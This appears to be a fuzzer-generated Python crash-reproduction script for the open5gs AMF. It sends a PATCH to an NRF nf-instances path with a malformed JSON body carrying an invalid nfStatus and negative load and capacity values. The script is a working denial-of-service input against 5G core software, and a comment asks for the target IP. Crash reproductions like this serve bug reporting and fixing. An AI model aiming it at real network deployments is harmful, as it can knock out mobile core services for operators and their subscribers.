#!/usr/bin/env python3
# Crash reproduction for open5gs-amf (low)
# Detected: Sat May  9 08:31:26 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PATCH'
path = '/nnrf-nfm/v1/nf-instances/UDM-fuzz-8375'
body = b'{"nfStatus": 99999, "load": "-1", "capacity": "-1"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
